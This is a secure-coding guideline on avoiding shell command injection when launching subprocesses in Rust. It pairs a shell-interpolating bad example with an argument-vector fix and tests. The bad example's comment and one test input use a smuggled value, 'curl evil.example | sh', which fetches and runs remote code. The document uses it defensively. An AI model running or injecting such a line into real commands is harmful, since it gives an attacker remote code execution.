# api-subprocess-args

> Launch subprocesses with an explicit argument vector; never build a command line from untrusted input

## Why It Matters

Passing a constructed string to a shell hands the shell everything it knows:
`;`, `|`, `$(...)`, backticks, redirection, and globbing all act on data that
was meant to be a filename. The classic injection is not exotic — one user
field concatenated into a command is remote code execution with the service's
privileges. Rust's `Command` avoids this by default because it execs the
program directly with an argument list, so the fix is usually to stop
reaching for a shell at all.

## Contract

- Pass each argument as its own `arg()`/`args()` entry. There is no quoting to
  get right because no shell parses them.
- Do not invoke `sh -c` or `cmd /C` with interpolated data. If a shell feature
  is genuinely required, run the shell with a fixed script and pass user data
  as positional parameters or environment values.
- Treat the program name as trusted configuration, never as input; resolve it
  to an absolute path where the `PATH` is not under your control.
- Validate arguments that must not look like options, or terminate the option
  list with `--`, so a value beginning with `-` cannot become a flag.
- Set the environment explicitly for security-relevant work rather than
  inheriting whatever the parent had.
- Bound the child: deadline, output size, and an explicit kill path. A wedged
  child otherwise holds a worker forever.

## Bad

```rust
fn archive(name: &str) -> io::Result<()> {
    // name = "report.csv; curl evil.example | sh"
    Command::new("sh").arg("-c").arg(format!("tar czf out.tgz {name}")).status()?;
    Ok(())
}
```

## Good

```rust
use std::path::Path;
use std::process::Command;

#[derive(Debug, PartialEq)]
pub enum ArgError {
    LooksLikeOption,
}

/// The value is data, so it must not be able to become a flag.
fn checked_operand(value: &str) -> Result<&str, ArgError> {
    if value.starts_with('-') {
        return Err(ArgError::LooksLikeOption);
    }
    Ok(value)
}

pub fn archive(source: &Path, into: &Path) -> Result<Command, ArgError> {
    let name = source.to_str().ok_or(ArgError::LooksLikeOption)?;
    let mut command = Command::new("/usr/bin/tar");
    command
        .arg("czf")
        .arg(into)
        .arg("--") // end of options: everything after is an operand
        .arg(checked_operand(name)?);
    Ok(command)
}

fn main() {
    let command = archive(Path::new("report.csv"), Path::new("out.tgz")).expect("built");
    let rendered: Vec<_> = command.get_args().map(|a| a.to_string_lossy().into_owned()).collect();
    assert_eq!(rendered, ["czf", "out.tgz", "--", "report.csv"]);

    // Shell metacharacters are just characters in an argument vector.
    let hostile = archive(Path::new("a; curl evil.example | sh"), Path::new("out.tgz"))
        .expect("built");
    let args: Vec<_> = hostile.get_args().map(|a| a.to_string_lossy().into_owned()).collect();
    assert_eq!(args.last().map(String::as_str), Some("a; curl evil.example | sh"));

    assert_eq!(checked_operand("-rf"), Err(ArgError::LooksLikeOption));
}
```

## Failure Tests

- an argument containing `;`, `|`, `$(...)`, backticks, or a newline reaches
  the program as one literal operand;
- a value starting with `-` is rejected or lands after `--`;
- a filename containing spaces or quotes needs no escaping and is not split;
- the child is killed at its deadline and its exit status is reported;
- the child's output is bounded rather than read into memory without limit.

## See Also

- [api-path-containment](api-path-containment.md) - the same input often names a file
- [api-resource-limits](api-resource-limits.md) - bound the child's time and output
- [proj-cli-contract](proj-cli-contract.md) - the exit status and streams you are consuming
- [api-extract-or-reject](api-extract-or-reject.md) - validate before any side effect
- [obs-no-sensitive-data](obs-no-sensitive-data.md) - arguments appear in process listings and logs
